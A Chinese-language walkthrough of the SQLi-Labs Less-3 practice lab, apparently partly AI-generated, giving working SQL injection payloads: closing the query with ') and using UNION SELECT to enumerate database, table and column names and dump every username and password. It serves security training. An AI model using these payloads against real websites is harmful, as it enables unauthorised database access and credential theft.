# SQLi-Labs Less-3 完整复现步骤

下面是 **SQLi-Labs Less-3** 的完整复现步骤，你可以直接按顺序操作：

---

### 1. 环境与注入点判断

1. 访问靶场地址：

    ```Plain Text
    
    http://127.0.0.1/sqli-labs/Less-3/
    ```

2. 先测试单引号闭合：

    ```Plain Text
    
    ?id=1'
    ```

    页面会返回 SQL 语法错误，提示 `near '1')'`，说明原 SQL 语句的闭合方式是 `')`，即：

    ```SQL
    
    SELECT * FROM users WHERE id=('1')
    ```

---

### 2. 验证闭合方式

构造 payload 测试闭合是否成功：

```Plain Text

?id=1')--+
```

如果页面正常显示 `Your Login name` 和 `Your Password`，说明闭合成功。

---

### 3. 判断字段数

使用 `ORDER BY` 语句判断表的字段数：

```Plain Text

?id=1') ORDER BY 3--+
```

- 若 `ORDER BY 3` 正常，`ORDER BY 4` 报错，说明字段数为 **3**。

---

### 4. 构造 Union 注入 payload

利用 `UNION SELECT` 进行注入，获取数据：

#### （1）获取当前数据库名

```Plain Text

?id=-1') union select 1,2,database()--+
```

页面会显示当前数据库名（如 `security`）。

#### （2）获取数据库中的表名

```Plain Text

?id=-1') union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+
```

会返回所有表名（如 `users`）。

#### （3）获取表中的列名

```Plain Text

?id=-1') union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'--+
```

会返回列名（如 `username`, `password`）。

#### （4）获取用户名和密码

```Plain Text

?id=-1') union select 1,2,group_concat(username,':',password) from users--+
```

页面会直接显示所有用户的用户名和密码，完成注入。

---

### 关键原理

Less-3 的核心是 **闭合方式为 ** **`')`**，即需要用 `')` 闭合原 SQL 语句的括号和单引号，再通过 `--+` 注释掉后续内容，才能成功注入。
> （注：文档部分内容可能由 AI 生成）